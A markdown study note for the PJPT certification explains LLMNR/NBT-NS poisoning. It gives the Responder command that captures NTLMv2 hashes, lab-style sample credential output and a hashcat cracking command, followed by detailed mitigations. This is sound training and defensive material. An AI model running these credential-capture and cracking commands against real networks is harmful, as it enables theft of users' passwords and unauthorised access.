# LLMNR Poisoning (PJPT Prep)

## What is LLMNR?
- **LLMNR (Link-Local Multicast Name Resolution)** is used to identify hosts when DNS fails.
- Previously, NBT-NS was used for this purpose.
- **Key flaw:** Services may leak a user's username and NTLMv2 hash if an attacker responds to LLMNR/NBT-NS queries.

## Attack Overview
LLMNR poisoning allows an attacker to capture NTLMv2 hashes from users on the same network segment. These hashes can then be cracked offline to obtain cleartext passwords.

### Steps

#### 1. Run Responder
Responder is a tool that listens for LLMNR/NBT-NS requests and responds to them, tricking victims into sending their credentials.

```bash
sudo responder -I tun0 -dwP
```
- `-I tun0` : Specify the network interface
- `-d` : Enable NetBIOS poisoning
- `-w` : Enable WPAD proxy
- `-P` : Enable LLMNR poisoning

#### 2. Wait for Hashes
When a victim attempts to resolve a name and LLMNR/NBT-NS is used, Responder will capture the NTLMv2 hash.

Example output:
```
[SMBv2] NTLMv2-SSP Username : MARVEL\fcastle
[SMBv2] NTLMv2-SSP Hash    : fcastle::MARVEL:61dde887aeb2af2a:76dd8039b96061195586bc9a4ef5f3c1:...:0101000000000000...
```

#### 3. Crack the Hash
Use hashcat to crack the captured hash (mode 5600 for NTLMv2):

```bash
hashcat -m 5600 hashes.txt rockyou.txt
```
- `hashes.txt` : File containing captured hashes
- `rockyou.txt` : Wordlist

Example cracked output:
```
Session..........: hashcat
Status...........: Cracked
...
Password1
```

## Mitigation

### Primary Defense: Disable LLMNR and NBT-NS

**The best defense is to disable LLMNR and NBT-NS entirely:**

#### Disable LLMNR
- Open **Group Policy Editor** (`gpedit.msc`)
- Navigate to: `Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client`
- Find **"Turn OFF Multicast Name Resolution"**
- Set to **Enabled**

#### Disable NBT-NS
- Go to **Network Connections**
- Right-click network adapter > **Properties**
- Select **TCP/IPv4 Properties**
- Click **Advanced** > **WINS** tab
- Select **"Disable NetBIOS over TCP/IP"**

### Alternative: If LLMNR/NBT-NS Cannot Be Disabled

**If the organization must use or cannot disable LLMNR/NBT-NS:**

#### Network Segmentation
- **Require Network Access Control (NAC)**
- Implement proper network segmentation to limit attack scope
- Use VLANs to isolate critical systems

#### Strong Password Policy
- **Require strong user passwords:**
  - Minimum 14+ characters in length
  - Limit common word usage
  - Use complex combinations (uppercase, lowercase, numbers, symbols)
- **The longer and more complex the password, the harder it is to crack the captured hash**

#### Additional Measures
- **Monitor for Responder activity** in network logs
- **Implement SMB signing** to prevent relay attacks
- **Use multi-factor authentication (MFA)** where possible
- **Regular password rotation** policies

## Summary
- LLMNR/NBT-NS poisoning is a common way to capture Windows credentials on internal networks
- Use Responder to capture hashes, then crack them with hashcat
- **Primary mitigation:** Disable LLMNR and NBT-NS completely
- **If disabling isn't possible:** Implement NAC, strong passwords (14+ chars), and network segmentation 